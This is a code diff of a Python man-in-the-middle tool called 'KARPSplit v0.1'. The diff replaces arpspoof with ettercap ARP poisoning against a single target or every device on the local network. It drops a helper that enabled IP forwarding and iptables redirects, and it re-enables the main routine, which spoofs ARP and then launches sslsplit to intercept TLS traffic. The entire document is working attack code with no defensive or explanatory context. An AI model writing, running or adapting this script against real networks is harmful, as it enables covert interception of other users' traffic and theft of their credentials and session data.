@@ -6,23 +6,14 @@ import sys
 import os
 
 
-def prep():
-    f = open("/proc/sys/net/ipv4/ip_forward", 'w')
-    f.write("1")
-    f.close()
-    Popen(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])
-    Popen(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "443", "-j", "REDIRECT", "--to-port", "8443"])
-
-
 def arpspoof(target = None):
     gws = netifaces.gateways()
     gateway = gws['default'][netifaces.AF_INET][0]
-    print("Found gateway " + gateway)
-    interface = "eth0"
+    print("Using gateway " + gateway)
     if target is None:
-        spoofer = Popen(["arpspoof", "-i", interface, gateway])
+        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "///" "/"+gateway+"//"])
     else:
-        spoofer = Popen(["arpspoof", "-i", interface, "-t", target, gateway])
+        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "/"+target+"//", "/"+gateway+"//"])
     return spoofer
 
 
@@ -64,18 +55,15 @@ def read_output():
 
 print("\nKARPSplit v0.1\n")
 
-'''print("Preparing OS... ", end="")
-prep()
-print("Done")
 if len(sys.argv) > 1:
-    print("Starting ARP Spoof on " + sys.argv[1] + "... ", end="")
+    print("Starting ARP Spoof on " + sys.argv[1] + "... ")
     arpspoof(sys.argv[1])
     print("Done")
 else:
-    print("Starting ARP Spoof on all devices... ", end="")
+    print("Starting ARP Spoof on all devices... ")
     arpspoof()
     print("Done")
-time.sleep(1)'''
+time.sleep(1)
 print("Starting SSLSplit... ", end="")
 splitter = sslsplit()
 print("Done")
